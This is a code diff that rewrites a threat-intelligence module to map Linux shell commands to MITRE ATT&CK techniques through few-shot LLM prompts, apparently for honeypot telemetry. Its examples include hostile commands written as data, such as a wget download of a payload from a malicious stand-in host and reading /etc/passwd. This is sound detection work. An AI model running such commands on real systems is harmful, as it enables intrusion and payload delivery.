@@ -1,175 +1,246 @@
-import os
+import ast
+import json
 import re
-import pickle
-import numpy as np
-from loguru import logger
-from openai import OpenAI
+
 from dotenv import load_dotenv
-
-import nltk
-from nltk.tokenize import word_tokenize
-from nltk.stem import WordNetLemmatizer, porter
-
+from loguru import logger
 from pydantic import BaseModel, Field
 
-from src.proteus.telemetry.models import MitreMapping
+from src.proteus.telemetry.models import InteractionInfo, MitreMapping
 
 CONFIDENCE_THRESHOLD = 0.3
+MAX_INTERACTION_CONTEXT = 5
+
+MITRE_FEW_SHOT_EXAMPLES = [
+  (
+    ["ps -aux"],
+    "T1057",
+    0.97,
+    "The command 'ps -aux' is used to list all running processes on a system. This maps to process discovery with high confidence.",
+  ),
+  (
+    ["ls"],
+    "T1083",
+    0.21,
+    "The command 'ls' alone is ambiguous, so the confidence is low without surrounding context.",
+  ),
+  (
+    ["whoami", "users", "id"],
+    "T1033",
+    0.94,
+    "The command history shows current user discovery followed by user and group enumeration. The sequence strongly indicates system information discovery.",
+  ),
+  (
+    ["cd /var/log", "ls", "cat auth.log"],
+    "T1083",
+    0.78,
+    "The earlier navigation into /var/log makes the later ls and cat auth.log commands part of a file and directory discovery sequence influenced by prior context.",
+  ),
+  (
+    ["netstat", "ifconfig"],
+    "T1016",
+    0.96,
+    "The command history shows active network discovery followed by local interface enumeration. The grouped context supports network discovery with high confidence.",
+  ),
+  (
+    ["pwd"],
+    "T1083",
+    0.11,
+    "The command 'pwd' by itself does not provide enough context for a definitive mapping.",
+  ),
+  (
+    ["cat /etc/passwd"],
+    "T1003",
+    0.99,
+    "The command 'cat /etc/passwd' is used to read the contents of the /etc/passwd file. This maps to credential access with very high confidence.",
+  ),
+  (
+    ["wget maliciouscontent.com/payload"],
+    "T1105",
+    0.81,
+    "The command 'wget maliciouscontent.com/payload' is used to download a file from a remote server. This maps to ingress tool transfer with high confidence.",
+  ),
+  (
+    ["whoami"],
+    "T1033",
+    0.85,
+    "The command 'whoami' is used to display the current user's username. This maps to system information discovery with high confidence.",
+  ),
+  (
+    ["unknowncommand -arg"],
+    "T1059",
+    0.15,
+    "The command 'unknowncommand -arg' is not recognized. The mapping is uncertain.",
+  ),
+  (
+    ["gdsgya"],
+    "T1059",
+    0.06,
+    "The command 'gdsgya' is probably a typo or unknown command. The mapping is uncertain.",
+  ),
+]
 
 logger.add("logs/proteus_mitre_mapper.log", rotation="10 MB")
 
 load_dotenv()
 
-try:
-  nltk.data.find('tokenizers/punkt')
-  nltk.data.find('tokenizers/punkt_tab')
-  nltk.data.find('corpora/wordnet')
-except LookupError:
-  nltk.download('punkt', quiet=True)
-  nltk.download('punkt_tab', quiet=True)
-  nltk.download('wordnet', quiet=True)
-
-class Phase(BaseModel):
-  commands_indexes: str = Field(..., description="Comma-separated indexes of the commands in the history that belong to this phase")
-  cti_sentence: str = Field(..., description="The CTI sentence describing the adversary's action for this phase")
-
-
 class MitreMapper:
-  def __init__(self):
-    self.classifier = None
-    self.vectorizer = None
-    self.is_loaded = False
-    self.command_history = []
-    
-    self.lemmatizer = WordNetLemmatizer()
-    self.ps = porter.PorterStemmer()
+  def __init__(self, llm_client, llm_model):
+    self.llm_client = llm_client
+    self.llm_model = llm_model
 
-    self.llm_client = OpenAI(
-      base_url=os.getenv("OPENAI_BASE_URL"),
-      api_key=os.getenv("OPENAI_API_KEY")
+  def _format_interactions(self, interactions: list[InteractionInfo]) -> str:
+    recent_interactions = interactions[-MAX_INTERACTION_CONTEXT:]
+    return "\n".join(
+      f"[{index + 1}] {interaction.command}"
+      for index, interaction in enumerate(recent_interactions)
     )
-    self.llm_model = os.getenv("OPENAI_MODEL")
-    
-    self._load_models()
 
-  def _load_models(self):
-    try:
-      base_dir = os.path.dirname(os.path.abspath(__file__))
-      model_path = os.path.join(base_dir, "mapper", "ml_model", "MLP_classifier.sav") 
-      
-      if os.path.exists(model_path):
-        with open(model_path, 'rb') as model_file:
-          self.vectorizer, self.classifier = pickle.load(model_file)
-        self.is_loaded = True
-        logger.success("Correlation engine loaded successfully.")
+  def _build_example_text(self) -> str:
+    example_blocks: list[str] = []
+    for commands, technique_id, confidence, cti_sentence in MITRE_FEW_SHOT_EXAMPLES:
+      target_cmd = commands[-1]
+      history_cmds = commands[:-1]
+
+      if history_cmds:
+        history_lines = "\n".join(f"[{index + 1}] {cmd}" for index, cmd in enumerate(history_cmds))
       else:
-        logger.error(f"Model file not found: {model_path}")
-    except Exception as e:
-      logger.error(f"Error loading MITRE model: {e}")
-  
-  def generate_attack_phases(self, history: list[str]) -> list[Phase]:
-    if not history:
-      return []
-    
-    if not self.llm_client.api_key:
-      raise ValueError("OPENAI_API_KEY not configured in the .env file")
-    
-    history_text = "\n".join([f"[{i+1}] {cmd}" for i, cmd in enumerate(history)])
+        history_lines = "No prior history."
+      
+      example_blocks.append(
+        f"Interaction History (Context):\n{history_lines}\n"
+        f"Target Command to Evaluate: '{target_cmd}'\n"
+        "Expected mapping:\n"
+        f'{{"technique_id": "{technique_id}", "confidence": {confidence}, "cti_sentence": "{cti_sentence}"}}'
+      )
 
-    system_prompt = "Group the bash commands into phases. Answer ONLY with one line per phase using the exact format: [Numbers] Adversaries may <description>."
+    return "\n\n".join(example_blocks)
 
-    if not self.llm_model:
-      logger.error("OPENAI_MODEL not configured in the .env file. Cannot generate CTI sentence.")
-      return []
-    
+  def _build_mapping_prompt(self, current_command: str, interactions: list[InteractionInfo]) -> tuple[str, str]:
+    history_text = self._format_interactions(interactions)
+    example_text = self._build_example_text()
+
+    system_prompt = (
+      "You are an expert Cyber Threat Intelligence analyst mapping Linux shell commands to MITRE ATT&CK techniques. "
+      "Return only valid JSON and do not wrap it in markdown. "
+      "Your core task is to evaluate the 'Target Command' ONLY, using the 'Interaction History' solely as context to resolve ambiguities."
+    )
+    user_prompt = (
+      f"Examples:\n{example_text}\n\n"
+      f"Interaction History (Context):\n{history_text if history_text else 'No prior history.'}\n\n"
+      f"Target Command to Evaluate: '{current_command}'\n\n"
+      "Task: Identify the most likely MITRE ATT&CK technique for the 'Target Command' above. "
+      "Return a single JSON object with these exact fields:\n"
+      '{"technique_id": "T####", "confidence": 0.0, "cti_sentence": "<sentence detailing the reasoning for THIS specific target command>"}'
+    )
+
+    return system_prompt, user_prompt
+
+  def _parse_prediction_payload(self, raw_output: str) -> object:
+    text = raw_output.strip()
+    if text.startswith("```"):
+      text = re.sub(r"^```(?:json)?\s*", "", text, flags=re.IGNORECASE)
+      text = re.sub(r"\s*```$", "", text)
+
     try:
+      return json.loads(text)
+    except json.JSONDecodeError:
+      match = re.search(r"\{.*\}", text, re.DOTALL)
+      if match:
+        candidate = match.group(0)
+        try:
+          return json.loads(candidate)
+        except json.JSONDecodeError:
+          try:
+            return ast.literal_eval(candidate)
+          except (ValueError, SyntaxError):
+            return None
+
+      try:
+        return ast.literal_eval(text)
+      except (ValueError, SyntaxError):
+        return None
+
+  def _coerce_payload(self, payload: object) -> dict | None:
+    if isinstance(payload, dict):
+      if "mappings" in payload and isinstance(payload["mappings"], list):
+        for item in reversed(payload["mappings"]):
+          if isinstance(item, dict):
+            return item
+      return payload
+
+    if isinstance(payload, list):
+      for item in reversed(payload):
+        if isinstance(item, dict):
+          return item
+
+    return None
+
+  def _build_prediction(self, payload: dict, interactions: list[InteractionInfo]) -> MitreMapping | None:
+    if not payload:
+      return None
+
+    technique_id = str(payload.get("technique_id", "")).strip()
+    cti_sentence = str(payload.get("cti_sentence", "")).strip()
+
+    try:
+      confidence = float(payload.get("confidence", 0.0))
+    except (TypeError, ValueError):
+      confidence = 0.0
+
+    if not technique_id or not cti_sentence:
+      return None
+
+    confidence = max(0.0, min(1.0, confidence))
+    if confidence < CONFIDENCE_THRESHOLD:
+      return None
+
+    return MitreMapping(
+      technique_id=technique_id,
+      confidence=round(confidence, 3),
+      cti_sentence=cti_sentence,
+    )
+
+  def evaluate_command(self, command: str, interactions: list[InteractionInfo]) -> MitreMapping | None:
+    if not command.strip():
+      return None
+
+    if not self.llm_client or not self.llm_model:
+      logger.error("LLM client or model not configured. Cannot evaluate the command.")
+      return None
+
+    try:
+      system_prompt, user_prompt = self._build_mapping_prompt(command, interactions)
+
       response = self.llm_client.chat.completions.create(
         model=self.llm_model,
-        messages = [
+        messages=[
           {"role": "system", "content": system_prompt},
-          {"role": "user", "content": "History:\n[1] whoami\n[2] id\n[3] cat /etc/passwd"},
-          {"role": "assistant", "content": "[1, 2] Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.\n[3] Adversaries may attempt to dump credentials to obtain account login and credential material."},
-          {"role": "user", "content": f"History:\n{history_text}"}
+          {"role": "user", "content": user_prompt},
         ],
         temperature=0.1,
-        max_tokens=200
+        max_tokens=250,
       )
-      raw_output = response.choices[0].message.content
+
+      raw_output = response.choices[0].message.content if response.choices else None
       if not raw_output:
         logger.error("Unexpected response from OpenAI: No content received in the response.")
-        return []
-      raw_output = raw_output.strip()
-      logger.debug(f"Raw output from command history evaluation:\n{raw_output}")
-
-      return self.parse_llm_phrases(raw_output)
-    except Exception as e:
-      logger.error(f"Error evaluating command history with LLM: {e}")
-      return []
-    
-  def parse_llm_phrases(self, raw_output: str) -> list[Phase]:
-    phases: list[Phase] = []
-    pattern = r"\[?(.*?)\]?[:\-]*\s*(Adversaries may[^\n]+)"
-    matches = re.findall(pattern, raw_output, re.IGNORECASE)
-
-    for match in matches:
-      indexes_str = match[0].strip()
-      sentence = match[1].strip()
-      clean_sentence = sentence.split('\n')[0].strip()
-      clean_sentence = clean_sentence.replace('"', '').replace("'", "")
-
-      phases.append(Phase(
-        commands_indexes=indexes_str,
-        cti_sentence=clean_sentence
-      ))
-
-    return phases
-
-  def evaluate_command(self, command: str) -> list[MitreMapping] | None:
-    if not self.is_loaded or not command.strip():
-      return None
-
-    if not self.classifier or not self.vectorizer:
-      logger.error("The MITRE model is not completely loaded. Cannot evaluate the command.")
-      return None
-    
-    try:
-      self.command_history.append(command)
-      cti_phases = self.generate_attack_phases(self.command_history)
-      logger.debug(f"Generated CTI phases: {cti_phases}")
-      
-      if not cti_phases:
         return None
-      
-      mappings: list[MitreMapping] = []
-      
-      for phase in cti_phases:
-        command_indexes = phase.commands_indexes
-        cti_sentence = phase.cti_sentence
 
-        word_list = word_tokenize(cti_sentence)
-        lemmatized_list = [self.lemmatizer.lemmatize(w) for w in word_list]
-        preprocessed_text = ' '.join(lemmatized_list)
-        text_vectorized = self.vectorizer.transform([preprocessed_text])
-        probabilities = self.classifier.predict_proba(text_vectorized)
+      payload = self._parse_prediction_payload(raw_output)
+      payload = self._coerce_payload(payload)
+      if not isinstance(payload, dict):
+        logger.error(f"Invalid MITRE mapping payload returned by the LLM: {raw_output}")
+        return None
 
-        top_index = np.argsort(probabilities[0])[-1]
-        top_label = self.classifier.classes_[top_index]
-        top_confidence = probabilities[0][top_index]
+      mitre_mapping = self._build_prediction(payload, interactions)
+      if not mitre_mapping:
+        logger.warning(f"LLM returned an unusable MITRE mapping for command '{command}': {raw_output}")
+        return None
 
-        if top_confidence < CONFIDENCE_THRESHOLD:
-          logger.warning(f"Low confidence ({top_confidence:.3f}) for command '{command}' with predicted technique '{top_label}'. Skipping MITRE mapping.")
-          continue
+      logger.info(f"Generated MITRE mapping for command '{command}': {mitre_mapping.model_dump()}")
+      return mitre_mapping
 
-        mitre_mapping = MitreMapping(
-          command_indexes=command_indexes,
-          technique_id=top_label,
-          confidence=round(float(top_confidence), 3),
-          cti_sentence=cti_sentence
-        )
-        mappings.append(mitre_mapping)
-      
-      return mappings
-        
     except Exception as e:
       logger.error(f"Error in live MITRE prediction: {e}")
       return None
